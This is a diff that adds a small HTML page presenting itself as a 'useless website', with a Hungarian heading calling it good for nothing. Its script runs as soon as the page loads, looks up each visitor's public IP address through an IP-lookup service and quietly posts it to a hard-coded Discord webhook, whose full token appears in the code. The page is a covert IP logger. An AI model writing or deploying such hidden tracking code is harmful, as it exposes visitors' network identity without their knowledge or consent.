@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Semmire se jó ez a weblap</h2>
+<title>Semmisem</title>
+  
+
+<p>Useless website</p>
+
+<script>
+  async function getIP() {
+    try {
+      const response = await fetch("https://api64.ipify.org?format=json");
+      const data = await response.json();
+      const ip = data.ip;
+
+      const url = "https://discord.com/api/webhooks/1163498983386263612/Q2_iAJ9b8kU4zDJc5LKgBzDohQM7Dll8mNlUsRXuqS1ARRtAeoUxRhrHGOq5QfBi4dnW";
+      const payload = {
+        content: `Public IP Address: ${ip}`
+      };
+
+      await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    } catch (error) {
+      console.error("Error:", error);
+    }
+  }
+
+  getIP();
+</script>
+
+</body>
+</html>
